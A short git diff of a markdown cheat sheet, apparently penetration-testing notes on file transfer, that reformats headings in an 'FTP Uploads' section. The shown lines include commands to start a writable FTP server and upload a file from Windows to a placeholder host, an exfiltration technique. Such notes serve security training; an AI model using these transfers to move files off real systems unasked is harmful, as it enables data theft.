@@ -206,17 +206,17 @@ If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the s
   <details> 
   <summary><strong>FTP Uploads</strong></summary>  
 
-  1. Start our FTP Server in Linux
+  **1. Start our FTP Server in Linux**
   ```bash
   sudo python3 -m pyftpdlib --port 21 --write
   ```
-  2. Upload the file in Windows
+  **2. Upload the file in Windows**
 
-  **Option 1: Upload file using Powershell**
+  Option 1: Upload file using Powershell
   ```cmd
   (New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
   ```
-  **Option 2: Create a Command File for the FTP Client to Upload a File**
+  Option 2: Create a Command File for the FTP Client to Upload a File
   Create a Command File for the FTP Client and Download the Target File
   ```cmd
   echo open <IP> > ftpcommand.txt
